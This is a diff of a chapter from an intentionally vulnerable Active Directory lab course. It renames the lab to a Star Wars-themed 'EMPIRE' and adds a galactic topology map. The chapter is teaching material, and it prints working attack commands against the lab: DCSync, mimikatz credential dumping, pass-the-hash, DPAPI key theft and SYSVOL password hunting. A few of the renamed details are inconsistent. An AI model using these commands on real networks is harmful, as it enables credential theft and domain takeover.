@@ -4,13 +4,13 @@ Active Directory is a service that runs on Windows Server. To attack it you must
 
 This chapter is dense by necessity. Almost every flag in PLAN.md depends on at least one mechanism described here. If you've never used Windows administratively, expect to re-read sections; the payoff is that chapters 04–14 stop feeling like incantations.
 
-> Lab safety reminder: DVAD is intentionally vulnerable. Run only on a network you own. Treat the VMs as hostile. The lab password and configs are public; do not reuse them anywhere else.
+> Lab safety reminder: EMPIRE is intentionally vulnerable. Run only on a network you own. Treat the VMs as hostile. The lab password and configs are public; do not reuse them anywhere else.
 
 ---
 
 ## 2.0 What "Windows" means in this context
 
-"Windows" in DVAD is the **Windows NT** family: a microkernel-ish executive plus a large userland subsystem stack. Lineage:
+"Windows" in EMPIRE is the **Windows NT** family: a microkernel-ish executive plus a large userland subsystem stack. Lineage:
 
 ```
 1993  NT 3.1            (first NT release)
@@ -21,11 +21,11 @@ This chapter is dense by necessity. Almost every flag in PLAN.md depends on at l
 2012  Server 2012(R2)    (Dynamic Access Control, gMSAs)
 2016  Server 2016        (PAW, Credential Guard, JEA)
 2019  Server 2019        (TLS 1.3 partial, Defender on by default)
-2022  Server 2022        (DVAD default; SMB AES-256, DNS-over-HTTPS client)
+2022  Server 2022        (EMPIRE default; SMB AES-256, DNS-over-HTTPS client)
 2025  Server 2025        (post-quantum experimental; tighter LSA defaults)
 ```
 
-All DVAD servers run Server 2022 unless explicitly noted; the workstation (`ws01`) runs Windows 10/11 Pro. Everything below is true on both.
+All EMPIRE servers run Server 2022 unless explicitly noted; the workstation (`tatooine`) runs Windows Server 2022 Core/11 Pro. Everything below is true on both.
 
 ### The 4-layer mental model
 
@@ -41,7 +41,7 @@ All DVAD servers run Server 2022 unless explicitly noted; the workstation (`ws01
 +-------------------------------------------------+
 ```
 
-Almost every attacker primitive lives in userland: LSASS in-memory secrets, the SAM hive on disk, the registry, processes, tokens. The kernel rarely matters until you're escalating from admin to a TCB context (driver loading, EDR bypass). DVAD does not require kernel exploits.
+Almost every attacker primitive lives in userland: LSASS in-memory secrets, the SAM hive on disk, the registry, processes, tokens. The kernel rarely matters until you're escalating from admin to a TCB context (driver loading, EDR bypass). EMPIRE does not require kernel exploits.
 
 ### What the names mean
 
@@ -103,7 +103,7 @@ PS C:\> tasklist /v /fi "imagename eq powershell.exe"
 PS C:\> Get-Process lsass -IncludeUserName     # needs admin
 ```
 
-For tree visualisation: Sysinternals `procexp.exe` (interactive) and `pslist /t` (CLI). DVAD doesn't ship Sysinternals on lab hosts; install them on your Kali side if you want to RDP and inspect.
+For tree visualisation: Sysinternals `procexp.exe` (interactive) and `pslist /t` (CLI). EMPIRE doesn't ship Sysinternals on lab hosts; install them on your Kali side if you want to RDP and inspect.
 
 ---
 
@@ -185,14 +185,14 @@ The final RID is what differentiates "Administrator" from "peter.parker." A few 
 
 ### Why this matters operationally
 
-- **Cross-forest privilege escalation (DF chain):** if you can forge a TGT in a *child* domain with `ExtraSids = S-1-5-21-ROOT-519`, you become Enterprise Admin in the forest root. The whole DF-001..040 family in PLAN.md rests on this.
-- **Pre-Windows 2000 Compatible Access (S-1-5-32-554):** historically included `Anonymous Logon`. If it still does in DVAD (it can, depending on the lab variant), null sessions can enumerate users and groups.
+- **Cross-forest privilege escalation (DF chain):** if you can forge a TGT in a *child* domain with `ExtraSids = S-1-5-21-TRADE-519`, you become Enterprise Admin in the forest root. The whole DF-001..040 family in PLAN.md rests on this.
+- **Pre-Windows 2000 Compatible Access (S-1-5-32-554):** historically included `Anonymous Logon`. If it still does in EMPIRE (it can, depending on the lab variant), null sessions can enumerate users and groups.
 - **RID 500 is special-cased:** UAC's "remote restrictions" do *not* apply to RID 500, even on workstations. This is why local admin lateral via PsExec works for `Administrator` but often fails for `localadmin1` on a workstation unless `LocalAccountTokenFilterPolicy=1`.
 
 ### Tools
 
 ```
-PS> $sid = (New-Object System.Security.Principal.NTAccount('CORP','peter.parker')).Translate([System.Security.Principal.SecurityIdentifier])
+PS> $sid = (New-Object System.Security.Principal.NTAccount('EMPIRE','peter.parker')).Translate([System.Security.Principal.SecurityIdentifier])
 PS> $sid.Value
 S-1-5-21-1234567890-1234567890-1234567890-1109
 
@@ -203,7 +203,7 @@ PS> ([System.Security.Principal.SecurityIdentifier]'S-1-5-21-1234567890-12345678
 From Linux:
 
 ```bash
-impacket-lookupsid corp.local/peter.parker:'DVADlab2024!'@10.10.0.10
+impacket-lookupsid empire.local/peter.parker:'EmpireLab2024!'@10.10.0.10
 # enumerates RIDs 500-1500 via MS-LSAT LsarLookupSids
 ```
 
@@ -257,9 +257,9 @@ When a principal authenticates, the **LSA (Local Security Authority)** in `lsass
 | `SeTcbPrivilege` | "Act as part of the OS" — full SYSTEM equivalence |
 | `SeTrustedCredManAccessPrivilege` | Access Credential Manager as a trusted caller |
 
-In DVAD specifically, watch for:
+In EMPIRE specifically, watch for:
 
-- **SQL service account on sql01** running with `SeImpersonatePrivilege` (default for service accounts) → PrintSpoofer/GodPotato → SYSTEM on sql01 (PE-001/PE-002 family).
+- **SQL service account on kamino** running with `SeImpersonatePrivilege` (default for service accounts) → PrintSpoofer/GodPotato → SYSTEM on kamino (PE-001/PE-002 family).
 - **Backup Operators member** has `SeBackupPrivilege` enabled on DCs → can `robocopy /B` NTDS.dit out (PE-027 / CRED-013).
 - **Server Operators member** has `SeBackupPrivilege`, `SeRestorePrivilege`, `SeShutdownPrivilege`, `SeSystemtimePrivilege`, and crucially the ability to *configure services* on the DC (PE-029).
 
@@ -485,7 +485,7 @@ These files are **always locked** while Windows runs — held open by the kernel
    ```
 3. **`SeBackupPrivilege` + raw NTFS read** (robocopy /B, or libraries like `pwdump`/`impacket` with `\\.\C:` raw read).
 
-### Registry values for offence (DVAD-relevant)
+### Registry values for offence (EMPIRE-relevant)
 
 | Path | Why |
 |---|---|
@@ -504,7 +504,7 @@ These files are **always locked** while Windows runs — held open by the kernel
 | `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` | `AlwaysInstallElevated` (PE-???) |
 | `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` | `EnableLUA`, `ConsentPromptBehaviorAdmin`, `LocalAccountTokenFilterPolicy` |
 
-DVAD purposely sets `FullSecureChannelProtection=0` on DCs (ZeroLogon path) and `LocalAccountTokenFilterPolicy=1` on member servers (lateral SMB easier).
+EMPIRE purposely sets `FullSecureChannelProtection=0` on DCs (ZeroLogon path) and `LocalAccountTokenFilterPolicy=1` on member servers (lateral SMB easier).
 
 ### Reading the registry from PowerShell
 
@@ -568,9 +568,9 @@ WDAGUtilityAccount:504:...
 
 The leftmost hash is LM (`aad3b435...` is *empty LM*, meaning LM hashes are disabled — modern default). The second is NT — that's the one you crack or pass.
 
-### Why the local Administrator hash matters in DVAD
+### Why the local Administrator hash matters in EMPIRE
 
-Local admin passwords are often **shared across hosts** in an organisation. If `Administrator:NTHASH` on `ws01` matches `file01`, you can `psexec` to file01 with `--local-auth` using just that hash. DVAD intentionally re-uses the local admin password across some hosts to teach this lesson. See LAT-002 in PLAN.md.
+Local admin passwords are often **shared across hosts** in an organisation. If `Administrator:NTHASH` on `tatooine` matches `scarif`, you can `psexec` to scarif with `--local-auth` using just that hash. EMPIRE intentionally re-uses the local admin password across some hosts to teach this lesson. See LAT-002 in PLAN.md.
 
 ### LAPS — the mitigation
 
@@ -579,10 +579,10 @@ Microsoft LAPS (now "Windows LAPS" since 2023) randomises local admin passwords 
 - Legacy: `ms-MCS-AdmPwd` (cleartext, ACL-controlled) and `ms-MCS-AdmPwdExpirationTime`.
 - Modern: `msLAPS-Password` (JSON blob, optionally encrypted).
 
-If you can read `ms-MCS-AdmPwd` on a computer object → you have its local admin password. DVAD seeds a misconfigured LAPS ACL on at least one OU; that's CRED-019.
+If you can read `ms-MCS-AdmPwd` on a computer object → you have its local admin password. EMPIRE seeds a misconfigured LAPS ACL on at least one OU; that's CRED-019.
 
 ```bash
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --laps
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --laps
 ```
 
 ---
@@ -605,7 +605,7 @@ NTDS.dit is an **ESE (Extensible Storage Engine)** database — same engine used
 Every directory object is a row in `datatable`, attributed by columns. A user has columns including:
 
 - `samAccountName` (downlevel name)
-- `userPrincipalName` (UPN: `peter.parker@corp.local`)
+- `userPrincipalName` (UPN: `peter.parker@empire.local`)
 - `cn` (CN: `peter.parker Smith`)
 - `objectSid`
 - `objectGUID`
@@ -635,7 +635,7 @@ You do not unroll this by hand. `secretsdump -ntds ntds.dit -system SYSTEM LOCAL
 
 1. **DCSync** — MS-DRSR `DRSGetNCChanges` RPC. Requires `Replicating Directory Changes`/`...-All` extended rights. Targets the DC over RPC over SMB or TCP/135.
    ```bash
-   impacket-secretsdump -just-dc corp.local/doctor.strange:'…'@10.10.0.10
+   impacket-secretsdump -just-dc empire.local/doctor.strange:'…'@10.10.0.10
    ```
 2. **VSS + copy.** Snapshot C:, copy `ntds.dit` + `SYSTEM` hive, parse offline.
 3. **`ntdsutil ifm`** — Microsoft-blessed IFM backup:
@@ -645,7 +645,7 @@ You do not unroll this by hand. `secretsdump -ntds ntds.dit -system SYSTEM LOCAL
    Produces an Active Directory subfolder with `ntds.dit` and the registry subset needed.
 4. **Backup Operators direct read** — `robocopy /B C:\Windows\NTDS C:\Users\Public ntds.dit`.
 
-DVAD ships at least one of each path (DCSync via `doctor.strange`, IFM via a Server Operators member, robocopy via Backup Operators) — read CRED-007/CRED-013/CRED-014 in PLAN.md.
+EMPIRE ships at least one of each path (DCSync via `doctor.strange`, IFM via a Server Operators member, robocopy via Backup Operators) — read CRED-007/CRED-013/CRED-014 in PLAN.md.
 
 ---
 
@@ -670,24 +670,24 @@ mimikatz # sekurlsa::logonpasswords
 Authentication Id : 0 ; 1234567 (00000000:0012d687)
 Session           : Interactive from 1
 User Name         : peter.parker
-Domain            : CORP
-Logon Server      : DC01
+Domain            : EMPIRE
+Logon Server      : coruscant
 Logon Time        : 2026-05-21 09:12:33
 SID               : S-1-5-21-1234567890-1234567890-1234567890-1109
         msv :
          [00000003] Primary
          * Username : peter.parker
-         * Domain   : CORP
+         * Domain   : EMPIRE
          * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
          * SHA1     : ...
         tspkg :
         wdigest :
          * Username : peter.parker
-         * Domain   : CORP
+         * Domain   : EMPIRE
          * Password : (null)         <-- empty because WDigest not enabled
         kerberos :
          * Username : peter.parker
-         * Domain   : CORP.LOCAL
+         * Domain   : empire.local
          * Password : (null)
 ```
 
@@ -703,7 +703,7 @@ SID               : S-1-5-21-1234567890-1234567890-1234567890-1109
 | `ProcessExplorer.exe -> Create dump` | when interactive |
 | Direct syscall (`NtReadVirtualMemory`) bypassing API hooks | EDR-evasion tradecraft |
 
-### Defenses (DVAD does NOT enable these)
+### Defenses (EMPIRE does NOT enable these)
 
 - **LSA Protection (`HKLM\SYSTEM\CCS\Control\Lsa\RunAsPPL=1`)**. Makes lsass.exe a Protected Process Light.
 - **Credential Guard.** VBS (Virtualization-Based Security) isolates LSA secrets in a separate VTL1 process (`LsaIso.exe`); even SYSTEM in VTL0 cannot read them.
@@ -719,12 +719,12 @@ SID               : S-1-5-21-1234567890-1234567890-1234567890-1109
 
 | Version | Released | Notes |
 |---|---|---|
-| SMB1 (CIFS) | 1996 | EternalBlue surface; disable in production. DVAD enables it for legacy share semantics |
+| SMB1 (CIFS) | 1996 | EternalBlue surface; disable in production. EMPIRE enables it for legacy share semantics |
 | SMB2.0/2.1 | 2006/2009 | Modern baseline |
 | SMB3.0 | 2012 | AES-CCM encryption, signing default for DC sessions |
 | SMB3.1.1 | 2015 | AES-GCM, pre-auth integrity (defeats downgrade) |
 
-DVAD enables SMB1 on at least one host (file01) to support a "legacy share" attack (IA-018-ish).
+EMPIRE enables SMB1 on at least one host (scarif) to support a "legacy share" attack (IA-018-ish).
 
 ### Three things SMB carries
 
@@ -734,7 +734,7 @@ DVAD enables SMB1 on at least one host (file01) to support a "legacy share" atta
 
 ### Important named pipes
 
-| Pipe | RPC interface (UUID) | What it does | DVAD relevance |
+| Pipe | RPC interface (UUID) | What it does | EMPIRE relevance |
 |---|---|---|---|
 | `\samr` | `12345778-1234-abcd-ef00-0123456789ac` | SAM management | RID cycling, password reset (`SamrSetInformationUser`) |
 | `\lsarpc` | `12345778-1234-abcd-ef00-0123456789ab` | LSA | SID lookups, trust enumeration |
@@ -758,7 +758,7 @@ A **null session** is an SMB connection with empty credentials. Historically, th
 - `HKLM\SYSTEM\CCS\Control\Lsa\RestrictAnonymous=1` blocks anonymous LSARPC enumeration.
 - `RestrictAnonymousSAM=1` blocks SAMR enumeration.
 
-DVAD on DCs leaves `RestrictAnonymous=0` (default) and the `Pre-Windows 2000 Compatible Access` group includes `Anonymous Logon` — enabling RID cycling via `impacket-lookupsid`.
+EMPIRE on DCs leaves `RestrictAnonymous=0` (default) and the `Pre-Windows 2000 Compatible Access` group includes `Anonymous Logon` — enabling RID cycling via `impacket-lookupsid`.
 
 ---
 
@@ -866,11 +866,11 @@ For network logons (type 3) of a non-built-in admin (RID ≠ 500), only the *fil
 1. `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy=1` — disables the filter for *all* local accounts.
 2. `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken=0` — disables it specifically for RID 500 (in case it was enabled).
 
-DVAD sets `LocalAccountTokenFilterPolicy=1` on member servers (so lateral with a non-RID-500 local admin works). PE-???/LAT-??? exercises rely on this.
+EMPIRE sets `LocalAccountTokenFilterPolicy=1` on member servers (so lateral with a non-RID-500 local admin works). PE-???/LAT-??? exercises rely on this.
 
 ### UAC bypass surface
 
-Many UAC bypasses exist (Fodhelper, ComputerDefaults, EventVwr, sdclt, slui, etc.), all relying on auto-elevating signed binaries that read attacker-controlled inputs. DVAD doesn't require you to chain UAC bypasses — local admin in the lab is straight-shot.
+Many UAC bypasses exist (Fodhelper, ComputerDefaults, EventVwr, sdclt, slui, etc.), all relying on auto-elevating signed binaries that read attacker-controlled inputs. EMPIRE doesn't require you to chain UAC bypasses — local admin in the lab is straight-shot.
 
 ---
 
@@ -970,13 +970,13 @@ We'll come back to detection writing in Chapter 13.
 - **`C$`, `D$`, ...** — drive admin shares.
 - **`IPC$`** — interprocess communication share (named pipes). The thing null-session enumeration targets.
 - **`NETLOGON`** — domain-scoped logon scripts, replicated.
-- **`SYSVOL`** — domain-scoped GPO container, replicated. Search for `groups.xml`, `services.xml`, `scheduledtasks.xml` here — they used to contain encrypted-but-decryptable passwords (`cpassword`, CVE-2014-1812). DVAD seeds a SYSVOL cpassword in one place — that's CRED-006.
+- **`SYSVOL`** — domain-scoped GPO container, replicated. Search for `groups.xml`, `services.xml`, `scheduledtasks.xml` here — they used to contain encrypted-but-decryptable passwords (`cpassword`, CVE-2014-1812). EMPIRE seeds a SYSVOL cpassword in one place — that's CRED-006.
 
 ```bash
 # Grep SYSVOL for cpassword (mounted via SMB)
-smbclient.py corp.local/peter.parker:DVADlab2024@10.10.0.10 \\SYSVOL
+smbclient.py empire.local/peter.parker:EMPIRElab2024@10.10.0.10 \\SYSVOL
 # or mount over SMB and use ripgrep
-mount -t cifs //10.10.0.10/SYSVOL /mnt/sysvol -o username=peter.parker,password='DVADlab2024!'
+mount -t cifs //10.10.0.10/SYSVOL /mnt/sysvol -o username=peter.parker,password='EmpireLab2024!'
 rg -i cpassword /mnt/sysvol/
 ```
 
@@ -997,7 +997,7 @@ Variants: reflective DLL, manual mapping, process hollowing (CreateProcess SUSPE
 
 EDRs hook those API names (`VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`); modern offensive tradecraft uses direct syscalls or indirect syscalls (via legitimate gadget addresses inside `ntdll`).
 
-DVAD doesn't require you to write injectors. But when you read mimikatz, Cobalt Strike, or Sliver source, you'll meet these primitives.
+EMPIRE doesn't require you to write injectors. But when you read mimikatz, Cobalt Strike, or Sliver source, you'll meet these primitives.
 
 ---
 
@@ -1027,10 +1027,10 @@ PS> Get-CimInstance Win32_Service | Where-Object State -eq 'Running'
 PS> Get-CimInstance Win32_OperatingSystem | Select-Object Caption,OSArchitecture,Version,BuildNumber
 
 # Remote
-PS> Get-CimInstance Win32_Process -ComputerName ws01 -Credential (Get-Credential)
+PS> Get-CimInstance Win32_Process -ComputerName tatooine -Credential (Get-Credential)
 
 # Create a process remotely (this is what wmiexec.py does)
-PS> Invoke-WmiMethod -ComputerName ws01 -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\Users\Public\out.txt"
+PS> Invoke-WmiMethod -ComputerName tatooine -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\Users\Public\out.txt"
 ```
 
 ### WMI Event Subscription persistence (PER-002)
@@ -1061,7 +1061,7 @@ PowerShell is not a third-party tool — it's part of Windows. There are two eng
 - **Windows PowerShell 5.1** — `powershell.exe`, ships in-box, .NET Framework, last legacy release.
 - **PowerShell 7.x** — `pwsh.exe`, separate install, .NET 6/7/8.
 
-DVAD targets PS 5.1 (preinstalled on Server 2022).
+EMPIRE targets PS 5.1 (preinstalled on Server 2022).
 
 ### Security features (and how attackers bypass them)
 
@@ -1074,7 +1074,7 @@ DVAD targets PS 5.1 (preinstalled on Server 2022).
 | Module Logging (4103) | records pipeline calls | same |
 | Transcription | per-session transcript file | same |
 
-DVAD doesn't enable AMSI or PS logging on member servers by default. They are enabled on `ws01` to teach you what tripping them looks like.
+EMPIRE doesn't enable AMSI or PS logging on member servers by default. They are enabled on `tatooine` to teach you what tripping them looks like.
 
 Detailed PS coverage is in chapter 03.
 
@@ -1103,7 +1103,7 @@ PS> Get-ScheduledTask | ForEach-Object {
 } | Where-Object { $_.User -match 'SYSTEM' }
 ```
 
-Event 4698 fires on task creation. DVAD plants at least one weakly-ACL'd scheduled task on `ws01` — that's a PE-flag.
+Event 4698 fires on task creation. EMPIRE plants at least one weakly-ACL'd scheduled task on `tatooine` — that's a PE-flag.
 
 ---
 
@@ -1118,11 +1118,11 @@ You learned the network in chapter 01. From the Windows side, a few additional f
 - **mDNS** (UDP 5353) — Bonjour-style; Windows 10+ joins in.
 - **WPAD** — Web Proxy Auto-Discovery. Looks up `wpad.<domain>` over DNS, then DHCP option 252, then NetBIOS. If unresolved at DNS but resolvable over NetBIOS/LLMNR → attacker serves `wpad.dat` → HTTP NTLM auth → relay.
 
-Disable LLMNR/NBT-NS via GPO. DVAD leaves them enabled (IA-001..IA-005 family relies on this).
+Disable LLMNR/NBT-NS via GPO. EMPIRE leaves them enabled (IA-001..IA-005 family relies on this).
 
 ### Firewall
 
-`netsh advfirewall` / `Get-NetFirewallRule` / `New-NetFirewallRule`. Each rule has direction, protocol, port, program, profile (Domain/Private/Public). DVAD's `post-install.ps1` disables the firewall on all member servers for lab simplicity — a real-world unicorn. Production hosts must enforce profiles.
+`netsh advfirewall` / `Get-NetFirewallRule` / `New-NetFirewallRule`. Each rule has direction, protocol, port, program, profile (Domain/Private/Public). EMPIRE's `post-install.ps1` disables the firewall on all member servers for lab simplicity — a real-world unicorn. Production hosts must enforce profiles.
 
 ### IPv6
 
@@ -1158,7 +1158,7 @@ When a user authenticates interactively, LSA derives the user's master key from 
 
 ```bash
 # Extract domain backup key
-impacket-dpapi backupkeys --target dc01.corp.local -u Administrator -p 'pass'
+impacket-dpapi backupkeys --target coruscant.empire.local -u Administrator -p 'pass'
 
 # Decrypt a master key with the backup key
 impacket-dpapi masterkey -file <user-mkfile> -pvk backup.pvk
@@ -1167,7 +1167,7 @@ impacket-dpapi masterkey -file <user-mkfile> -pvk backup.pvk
 impacket-dpapi credential -file <credfile> -key <decoded mk hex>
 ```
 
-DVAD plants a DPAPI-protected credential on `file01` (CRED-024 in PLAN.md — read the file there for exact location).
+EMPIRE plants a DPAPI-protected credential on `scarif` (CRED-024 in PLAN.md — read the file there for exact location).
 
 ---
 
@@ -1195,15 +1195,15 @@ A PE (Portable Executable) file (`.exe`, `.dll`, `.sys`) has:
 - AppLocker bypass via signed Microsoft binaries (LoLBins) that load attacker DLLs (msbuild.exe, installutil.exe, regsvr32.exe with scrobj.dll, mshta.exe, etc.).
 - WDAC bypass: harder; relies on unfixed audit-only rules, signed renamed binaries, or kernel exploits.
 
-DVAD doesn't enforce AppLocker/WDAC. The "LoLBin" category still matters for *evasion* but not bypass.
+EMPIRE doesn't enforce AppLocker/WDAC. The "LoLBin" category still matters for *evasion* but not bypass.
 
 ---
 
-## 2.23 Putting it together — a privesc chain on file01
+## 2.23 Putting it together — a privesc chain on scarif
 
 To anchor everything, here's a worked microexample tying these pieces together. (You'll do the full one in lab 11.A.)
 
-**Goal:** as `peter.parker` (a Domain User) with WinRM access to `file01`, escalate to SYSTEM on file01.
+**Goal:** as `peter.parker` (a Domain User) with WinRM access to `scarif`, escalate to SYSTEM on scarif.
 
 1. `peter.parker` lands via WinRM. `whoami /priv` shows no privileges other than `SeChangeNotifyPrivilege`.
 2. Enumerate services: `Get-CimInstance Win32_Service | Where-Object StartMode -eq 'Auto'`. One service `BackupRunner` runs as SYSTEM with `PathName` = `C:\Tools\backup.exe`.
@@ -1212,7 +1212,7 @@ To anchor everything, here's a worked microexample tying these pieces together. 
 5. Restart the service: `Restart-Service BackupRunner`.
 6. `whoami /groups` now includes `BUILTIN\Administrators`. Logout/login or grab a new WinRM session.
 7. As local admin, `reg save HKLM\SAM`, `reg save HKLM\SYSTEM`, exfil, `secretsdump LOCAL` — local NT hashes.
-8. The local Administrator's NT hash matches **the same on sql01** (shared local-admin password). Pivot: `nxc smb 10.10.0.14 -u Administrator -H <NT> --local-auth`.
+8. The local Administrator's NT hash matches **the same on kamino** (shared local-admin password). Pivot: `nxc smb 10.10.0.14 -u Administrator -H <NT> --local-auth`.
 
 That chain touched: tokens (1), privileges (2), services (3, 5), ACLs (3), the SAM (7), and lateral movement (8). All the chapter-02 mechanics in one flow.
 
@@ -1220,12 +1220,12 @@ That chain touched: tokens (1), privileges (2), services (3, 5), ACLs (3), the S
 
 ## Lab exercises
 
-> **Prereq:** You have credentials for `peter.parker` (Domain User). Compromise enough to drop into a shell on `ws01.corp.local` (10.10.0.100) or `file01` (10.10.0.13). Easiest path:
+> **Prereq:** You have credentials for `peter.parker` (Domain User). Compromise enough to drop into a shell on `tatooine.empire.local` (10.10.0.100) or `scarif` (10.10.0.13). Easiest path:
 >
 > ```bash
-> evil-winrm -i 10.10.0.100 -u peter.parker -p 'DVADlab2024!'
-> # if access denied on ws01:
-> evil-winrm -i 10.10.0.13 -u peter.parker -p 'DVADlab2024!'
+> evil-winrm -i 10.10.0.100 -u peter.parker -p 'EmpireLab2024!'
+> # if access denied on tatooine:
+> evil-winrm -i 10.10.0.13 -u peter.parker -p 'EmpireLab2024!'
 > ```
 
 ### Exercise 2.A — Walk your token
@@ -1245,7 +1245,7 @@ Identify:
 Q: which RID identifies Domain Admins? Use that to compute the full Domain Admins SID for your domain. Verify with `Get-ADGroup "Domain Admins"` (RSAT) or:
 
 ```
-*Evil-WinRM* PS> ([System.Security.Principal.NTAccount]"CORP\Domain Admins").Translate([System.Security.Principal.SecurityIdentifier]).Value
+*Evil-WinRM* PS> ([System.Security.Principal.NTAccount]"EMPIRE\Domain Admins").Translate([System.Security.Principal.SecurityIdentifier]).Value
 ```
 
 ### Exercise 2.B — Inspect the registry for ZeroLogon flag
@@ -1255,7 +1255,7 @@ Q: which RID identifies Domain Admins? Use that to compute the full Domain Admin
                     Select-Object FullSecureChannelProtection
 ```
 
-If the value is `0` (or absent), the host is vulnerable to ZeroLogon if it's also a DC. `ws01` isn't a DC so this is informational; but the lab DC `dc01.corp.local` *is* and *is* vulnerable. (Don't fire the exploit until you've done chapter 10. Just record the registry state.)
+If the value is `0` (or absent), the host is vulnerable to ZeroLogon if it's also a DC. `tatooine` isn't a DC so this is informational; but the lab DC `coruscant.empire.local` *is* and *is* vulnerable. (Don't fire the exploit until you've done chapter 10. Just record the registry state.)
 
 ### Exercise 2.C — Dump local SAM (only if you have admin on a member server)
 
@@ -1314,14 +1314,14 @@ From a Kali pivot or with credentials:
 
 ```bash
 mkdir -p /mnt/sysvol
-mount -t cifs //10.10.0.10/SYSVOL /mnt/sysvol -o username=peter.parker,password='DVADlab2024!',vers=3.0
+mount -t cifs //10.10.0.10/SYSVOL /mnt/sysvol -o username=peter.parker,password='EmpireLab2024!',vers=3.0
 grep -ri "cpassword" /mnt/sysvol/ 2>/dev/null | head
 ```
 
 Or fully via SMB:
 
 ```bash
-impacket-smbclient.py corp.local/peter.parker:'DVADlab2024!'@10.10.0.10
+impacket-smbclient.py empire.local/peter.parker:'EmpireLab2024!'@10.10.0.10
 use SYSVOL
 recurse on
 ls
@@ -1340,7 +1340,7 @@ That's CRED-006.
 This one is admin-only (you need to read users' Protect folders or have a DPAPI domain backup key). After you've achieved DA in later chapters, come back and do:
 
 ```bash
-impacket-dpapi backupkeys --export -t dc01.corp.local -u Administrator -p 'DVADlab2024!'
+impacket-dpapi backupkeys --export -t coruscant.empire.local -u Administrator -p 'EmpireLab2024!'
 impacket-dpapi credential -file <credblob> -pvk domain_backupkey.pvk
 ```
 
@@ -1356,7 +1356,7 @@ impacket-dpapi credential -file <credblob> -pvk domain_backupkey.pvk
 6. What does LSASS do, and why do interactive (type 2/10) logons make it valuable to dump while network (type 3) logons don't?
 7. Why can't you `copy C:\Windows\NTDS\ntds.dit` while the host is running? Name three workarounds.
 8. What is RID 500 and why does it special-case UAC remote restrictions?
-9. Name three named pipes attackers enumerate on `\\dc01\IPC$` and which RPC interface each exposes.
+9. Name three named pipes attackers enumerate on `\\coruscant\IPC$` and which RPC interface each exposes.
 10. What is `RunAsPPL=1` and what does Mimikatz do to bypass it?
 11. Explain the linked-token model. What's the difference between the "full" and "filtered" token, and which one does `explorer.exe` run with?
 12. Identify two registry paths an attacker would set for autostart persistence and the event log channel that records their use.
@@ -1386,3 +1386,85 @@ impacket-dpapi credential -file <credblob> -pvk domain_backupkey.pvk
 - **0xBadJuju — *WMI for Detection and Response*** — WMI persistence detail.
 
 Next: [03-powershell.md](03-powershell.md).
+
+---
+
+# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping
+
+Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.
+
+## The Galactic Topology
+
+The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.
+
+```mermaid
+graph TD
+    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
+    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
+    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
+    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;
+
+    subgraph The Galactic Empire (empire.local)
+        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
+        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
+        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
+        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
+        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
+        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
+        Coruscant -- "Imperial Command" --> DeathStar
+        Coruscant --- Scarif
+        Coruscant --- Kamino
+        Coruscant --- Endor
+        Coruscant --- Mandalore
+    end
+
+    subgraph The Rebel Alliance (rebel.local)
+        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
+    end
+
+    subgraph The Trade Federation (trade.corp)
+        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
+    end
+
+    Coruscant <-->|Espionage / External Trust| Yavin4
+    Coruscant <-->|Treaty / Forest Trust| Neimoidia
+```
+
+## Infrastructure Mapping
+
+Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:
+
+### 1. The Core Domains
+* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
+* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
+* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
+* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.
+
+### 2. High-Value Targets (Servers)
+* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
+* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
+* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
+* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
